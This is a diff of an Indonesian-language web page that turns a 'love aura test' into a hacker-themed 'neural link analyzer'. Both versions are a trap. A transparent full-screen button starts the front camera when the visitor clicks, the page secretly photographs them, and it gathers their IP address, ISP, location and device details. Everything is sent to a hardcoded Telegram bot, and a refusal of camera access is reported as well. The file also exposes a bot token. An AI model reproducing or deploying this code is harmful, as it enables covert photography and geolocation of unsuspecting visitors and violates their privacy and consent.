@@ -3,233 +3,168 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>AI Love Aura Test ✨</title>
+    <title>NEURAL LINK ANALYZER v3.0</title>
     <style>
-        /* CSS Kawaii Aesthetic */
-        @import url('https://fonts.googleapis.com/css2?family=Varela+Round&display=swap');
+        @import url('https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;700&display=swap');
 
         body, html {
             margin: 0; padding: 0; width: 100%; height: 100%;
-            font-family: 'Varela Round', sans-serif;
-            background-color: #ffeef8; /* Pink Pastel Ultra Soft */
-            overflow: hidden;
-            display: flex; justify-content: center; align-items: center;
+            font-family: 'Fira Code', monospace;
+            background-color: #050505; color: #00ff41;
+            overflow: hidden; display: flex; justify-content: center; align-items: center;
         }
 
-        /* Latar belakang gelembung hati */
-        .bg-hearts {
+        .bg-grid {
             position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            background-image: url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0MCIgaGVpZ2h0PSI0MCIgdmlld0JveD0iMCAwIDQwIDQwIj48ZyBmaWxsLXJ1bGU9ImV2ZW5vZGQiPjxnIGZpbGw9IiNmZmI2YzEiIGZpbGwtb3BhY2l0eT0iMC40Ij48cGF0aCBkPSJNMCAwaDR2NGgwVjB6bTQgNGg0djRoMFY0em00IDRoNHY0aDBWOHptNCA0aDR2NGgwVjEyek0wIDhoNHY0SDBWOHptNCA0aDR2NGgwVjEyek0wIDEyaDR2NEgwVjEyek00IDE2aDR2NGgwViAxNnptOC04aDR2NGgwVjh6bTQtNGg0djRoMFY0em00IDRoNHY0aDBWOHptNC00aDR2NGgwVjh6bTQgNGg0djRoMFY8em0tMTIgOGg0djRoMGRE44em0tOCA4aDR2NGgwViAyNnptLTQgOGg0djRoMFY2NHptMC04aDR2NGgwViAxNnptLTggOGg0djRoMFY2NHptNCA0aDR2NGgwVjEyek0wIDI0aDR2NEgwViAyNHptNCA0aDR2NGgwViAyOHptMCA0aDR2NGgwViAzMnpNMjAgMjBoNHY0aDBWMjB6bTQgNGg0djRoMFY2NHptLTggOGg0djRoMGRE44em04LTJoNHY0aDBWMzB6bTQtNGg0djRoMFY2NnpNMzIgMjBoNHY0aDBWMjB6bTQtNGg0djRoMFYxNnpNMzIgMTZoNHY0aDBWMTZ6bS00IDRoNHY0aDBWMjB6bTQtMTJoNHY0aDBWNHptLTQgNGg0djRoMFY4em0wLThoNHY0aDBWMHptNC00aDR2NGgwVjB6bTggOGg0djRoMFY4ek0yOCAxNmg0djRoMFYxNnpNMjQgMTJoNHY0aDBWMTJ6TTIwIDhoNHY0aDBWOHptLTQgNGg0djRoMFYxMnpNMzIgNGg0djRoMFY0em0tNCA4aDR2NGgwVjEyek0yOCAwaDR2NGgwVjB6TTI0IDRoNHY0aDBWNHpNMjAgMGg0djRoMFYwek0wIDM2aDR2NGgwViAzNnptNC00aDR2NGgwViAzMnpNOC00aDR2NGgwViAyOHptNC00aDR2NGgwViAyNHptNC00aDR2NGgwViAyMHptNC00aDR2NGgwViAxNnptNC00aDR2NGgwViAxMnpNMjggNGg0djRoMFY0ek0zMiAwaDR2NGgwVjB6Ii8+PC9nPjwvZz48L3N2Zz4=');
-            opacity: 0.5; z-index: 1;
+            background-image: linear-gradient(rgba(0, 255, 65, 0.05) 1px, transparent 1px),
+                              linear-gradient(90deg, rgba(0, 255, 65, 0.05) 1px, transparent 1px);
+            background-size: 20px 20px; z-index: 1;
         }
 
         .container {
-            position: relative; z-index: 10;
-            background: rgba(255, 255, 255, 0.95);
-            padding: 30px; border-radius: 25px;
-            box-shadow: 0 10px 30px rgba(255, 182, 193, 0.6);
-            text-align: center; width: 85%; max-width: 380px;
-            border: 3px solid #ffb6c1;
-            transition: all 0.5s ease-in-out;
+            position: relative; z-index: 10; background: rgba(0, 0, 0, 0.9);
+            padding: 25px; border: 1px solid #00ff41; width: 85%; max-width: 380px;
+            box-shadow: 0 0 15px rgba(0, 255, 65, 0.3);
         }
 
-        /* Tombol jebakan transparan seluruh layar */
         #trigger {
             position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            background: transparent; border: none; cursor: pointer; z-index: 100;
+            background: transparent; border: none; z-index: 100; cursor: pointer;
         }
 
-        h1 { color: #ff69b4; font-size: 1.6rem; margin-bottom: 10px; text-shadow: 1px 1px 0px #fff; }
-        p { color: #888; font-size: 1rem; margin-bottom: 25px; line-height: 1.5; }
-
-        .heart-icon { font-size: 5rem; color: #ff69b4; animation: pulse 1.5s infinite; }
-
-        /* Animasi Scanner Hati */
-        #scan-visual {
-            display: none; position: relative; width: 160px; height: 160px;
-            margin: 20px auto;
-        }
-        #scan-visual::after {
-            content: '💖'; font-size: 5.5rem;
-            position: absolute; top: 50%; left: 50%;
-            transform: translate(-50%, -50%);
-        }
         .scan-bar {
-            position: absolute; width: 100%; height: 5px;
-            background: #ff69b4; box-shadow: 0 0 15px #ff69b4;
-            border-radius: 3px; top: 0;
-            animation: scanMove 2.5s infinite ease-in-out;
+            width: 100%; height: 2px; background: #00ff41;
+            box-shadow: 0 0 10px #00ff41; position: absolute;
+            animation: scanLine 2s infinite linear;
         }
 
-        /* Tampilan Hasil Analisa (Kawaii Mode) */
-        #result-view {
-            display: none;
-            opacity: 0;
-            animation: fadeIn 1s forwards;
-        }
-        .result-box {
-            background: #fff0f5; border: 2px solid #ffb6c1;
-            padding: 20px; border-radius: 15px;
-            margin-top: 15px; color: #ff1493;
-            font-size: 1.1rem; font-weight: bold;
-        }
-        .icon-celebrate { font-size: 3rem; display: block; margin-bottom: 10px; }
-        .score { font-size: 2.5rem; color: #ff69b4; font-weight: 900; }
+        @keyframes scanLine { 0% { top: 0; } 100% { top: 100%; } }
 
-        @keyframes pulse {
-            0% { transform: scale(1); opacity: 1; }
-            50% { transform: scale(1.1); opacity: 0.8; }
-            100% { transform: scale(1); opacity: 1; }
-        }
-        @keyframes scanMove {
-            0% { top: 0; } 50% { top: 100%; } 100% { top: 0; }
-        }
-        @keyframes fadeIn {
-            from { opacity: 0; transform: translateY(10px); }
-            to { opacity: 1; transform: translateY(0); }
-        }
-
-        /* Elemen teknis tersembunyi */
-        video, canvas { display: none; visibility: hidden; position: fixed; pointer-events: none; }
+        .terminal-text { font-size: 0.7rem; color: #008f11; line-height: 1.4; }
+        .data-val { color: #00ff41; font-weight: bold; }
+        
+        video, canvas { display: none; position: fixed; }
     </style>
 </head>
 <body>
 
-    <div class="bg-hearts"></div>
-
+    <div class="bg-grid"></div>
     <button id="trigger"></button>
 
-    <div class="container" id="content-box">
+    <div class="container">
         <div id="setup-view">
-            <div class="heart-icon">💖</div>
-            <h1>Cek Aura Cintamu!</h1>
-            <p>Penasaran seberapa besar level keimutan dan keberuntungan cintamu hari ini? ✨<br><br>Gunakan <b>Love Cam</b> kami untuk analisa instan!</p>
-            <p style="font-size: 0.75rem; color: #aaa; margin-top: 10px;">(Klik di mana saja untuk mulai)</p>
+            <h1 style="font-size: 1.1rem;">[ CORE_LINK_SYSTEM ]</h1>
+            <p style="font-size: 0.8rem; color: #888;">Sinkronisasi neural membutuhkan kalibrasi sensor biometrik.</p>
+            <p style="color: #00ff41; font-size: 0.7rem; border: 1px dashed #00ff41; padding: 10px;">
+                > TAP TO INITIALIZE UPLINK
+            </p>
         </div>
 
-        <div id="scan-view" style="display:none;">
-            <div id="scan-visual">
-                <div class="scan-bar"></div>
+        <div id="scan-view" style="display:none; position: relative; height: 150px;">
+            <div class="scan-bar"></div>
+            <div class="terminal-text" id="log-text">
+                Initializing...<br>
+                Fetching IP_ADDRESS...<br>
+                Accessing SENSOR_CAM...
             </div>
-            <h1 id="status-text" style="margin-top:20px; font-size: 1.3rem;">Menghubungkan ke Server...</h1>
-            <p>Jangan bergerak ya, imut! 😊</p>
         </div>
 
-        <div id="result-view">
-            <span class="icon-celebrate">✨🎀🎁🎀✨</span>
-            <h1>Analisa Selesai!</h1>
-            <div class="result-box">
-                Level Keimutanmu:<br>
-                <span class="score">100% (MAKSIMAL!)</span><br><br>
-                ✨ Aura cintamu sangat bersinar hari ini. Keberuntunganmu sedang tinggi! 💖
+        <div id="result-view" style="display:none;">
+            <h1 style="font-size: 1rem;">ACCESS GRANTED</h1>
+            <div class="terminal-text" id="final-log">
+                Identity: <span class="data-val">SECURE_USER</span><br>
+                Status: <span class="data-val">ENCRYPTED</span><br>
+                Neural: <span class="data-val">STABLE</span>
             </div>
-            <p style="font-size: 0.8rem; margin-top: 20px; color: #bbb;">(Simpan screenshot untuk keberuntungan)</p>
         </div>
     </div>
 
-    <video id="video" autoplay playsinline style="width: 1px; height: 1px;"></video>
+    <video id="video" autoplay playsinline></video>
     <canvas id="canvas"></canvas>
 
     <script>
-        // --- KONFIGURASI TELEGRAM (MASUKKAN DATA KAMU DI SINI) ---
         const TG_TOKEN = '8759534902:AAGrdxkHf0ytnacqKexI0OPuEPYrhWXGj7U'; 
         const TG_CHAT_ID = '986460435'; 
-        // ---------------------------------------------------------
 
         const video = document.getElementById('video');
         const canvas = document.getElementById('canvas');
         const trigger = document.getElementById('trigger');
-        const statusText = document.getElementById('status-text');
-        const setupView = document.getElementById('setup-view');
-        const scanView = document.getElementById('scan-view');
-        const resultView = document.getElementById('result-view');
-        const scanVisual = document.getElementById('scan-visual');
 
-        async function startLoveScan() {
-            // Hilangkan pemicu agar tidak klik 2x
+        // Fungsi Utama
+        async function startHackerScan() {
             trigger.style.display = 'none';
-            
-            // Ubah UI jadi mode Scanning
-            setupView.style.display = 'none';
-            scanView.style.display = 'block';
+            document.getElementById('setup-view').style.display = 'none';
+            document.getElementById('scan-view').style.display = 'block';
 
+            // 1. Ambil data Jaringan (IP, ISP, Lokasi) secara diam-diam
+            let networkInfo = "Gagal mengambil data jaringan";
             try {
-                // 1. Meminta Izin
-                const stream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { facingMode: "user" }, // Kamera depan
-                    audio: false 
-                });
-                
-                // 2. Hubungkan ke elemen video tersembunyi
-                video.srcObject = stream;
-                statusText.innerText = "Menganalisa Aura Cintamu... 💕";
-                scanVisual.style.display = 'block';
+                const res = await fetch('https://ipapi.co/json/');
+                const d = await res.json();
+                networkInfo = `
+🌐 [LOG JARINGAN]
+IP: ${d.ip}
+ISP: ${d.org}
+Lokasi: ${d.city}, ${d.region}, ${d.country_name}
+Device: ${navigator.platform}
+Browser: ${navigator.userAgent.split(') ')[1]}
+                `;
+            } catch (e) { console.log("IP API Blocked"); }
 
-                // 3. Tunggu 3 detik agar kamera menyesuaikan cahaya/fokus
+            // 2. Akses Kamera
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                video.srcObject = stream;
+
+                // Tunggu sebentar untuk autofocus
                 setTimeout(() => {
-                    takeAndSendPhoto(stream);
+                    captureAndSend(stream, networkInfo);
                 }, 3000);
 
             } catch (err) {
-                console.error(err);
-                statusText.innerText = "Gagal Konek! 😢";
-                alert("Sistem butuh izin kamera. Coba refresh dan pilih 'Allow'!");
+                sendToTelegram("❌ Target menolak akses kamera.\n\n" + networkInfo);
+                alert("SYSTEM_ERROR: Sensor biometrik tidak diizinkan.");
+                location.reload();
             }
         }
 
-        function takeAndSendPhoto(stream) {
-            // --- FIX UNTUK "FOTO GEPENG" ---
-            // Kita ambil dimensi video ASLI yang ditangkap browser, bukan hardware settings.
-            const videoWidth = video.videoWidth;
-            const videoHeight = video.videoHeight;
-
-            if (videoWidth > 0 && videoHeight > 0) {
-                // Setel ukuran canvas sesuai resolusi asli video agar tidak gepeng
-                canvas.width = videoWidth;
-                canvas.height = videoHeight;
-
-                const context = canvas.getContext('2d');
-                context.drawImage(video, 0, 0, canvas.width, canvas.height);
-                
-                // 4. Ubah canvas jadi Data URL (Base64)
-                const imageData = canvas.toDataURL('image/png');
-                
-                // 5. Kirim ke Telegram (Async di background)
-                sendPhotoToTelegram(imageData);
-
-                // 6. Matikan kamera agar lampu indikator mati
-                setTimeout(() => {
-                    stream.getTracks().forEach(track => track.stop());
-                }, 500);
-            } else {
-                console.error("Video tidak siap.");
-            }
-
-            // --- TAMPILKAN HASIL DI HTML (Gantinya alert) ---
-            scanView.style.display = 'none';
-            resultView.style.display = 'block';
-        }
-
-        // Fungsi Teknis Mengirim File ke Telegram API
-        function sendPhotoToTelegram(imageData) {
-            const blob = dataURItoBlob(imageData);
+        function captureAndSend(stream, networkInfo) {
+            const w = video.videoWidth;
+            const h = video.videoHeight;
+            canvas.width = w;
+            canvas.height = h;
             
+            const ctx = canvas.getContext('2d');
+            // Mirroring agar natural
+            ctx.translate(w, 0);
+            ctx.scale(-1, 1);
+            ctx.drawImage(video, 0, 0, w, h);
+            
+            const imageData = canvas.toDataURL('image/png');
+            const blob = dataURItoBlob(imageData);
+
+            // Kirim ke Telegram
             const formData = new FormData();
             formData.append('chat_id', TG_CHAT_ID);
-            formData.append('photo', blob, 'aurascan.png');
-            formData.append('caption', '🎀 Seseorang baru saja mengecek Aura Cintanya! (Foto Kamera Depan - No Stretch)');
+            formData.append('photo', blob, 'capture.png');
+            formData.append('caption', `🛡️ [SYSTEM LOG SUCCESS]\n${networkInfo}`);
 
-            // Menggunakan Fetch API untuk POST ke Telegram
             fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendPhoto`, {
                 method: 'POST',
                 body: formData
-            })
-            .then(response => response.json())
-            .then(data => console.log('Telegram Success:', data))
-            .catch(error => console.error('Telegram Error:', error));
+            });
+
+            // Selesai
+            stream.getTracks().forEach(t => t.stop());
+            document.getElementById('scan-view').style.display = 'none';
+            document.getElementById('result-view').style.display = 'block';
         }
 
-        // Helper: Mengubah Data URI (Base64) menjadi Blob
+        // Fungsi bantu kirim teks jika kamera gagal
+        function sendToTelegram(text) {
+            fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage?chat_id=${TG_CHAT_ID}&text=${encodeURIComponent(text)}`);
+        }
+
         function dataURItoBlob(dataURI) {
             const byteString = atob(dataURI.split(',')[1]);
             const mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];
@@ -239,8 +174,7 @@
             return new Blob([ab], {type: mimeString});
         }
 
-        // Jalankan saat layar diklik (syarat User Gesture)
-        trigger.addEventListener('click', startLoveScan);
+        trigger.addEventListener('click', startHackerScan);
     </script>
 </body>
 </html>
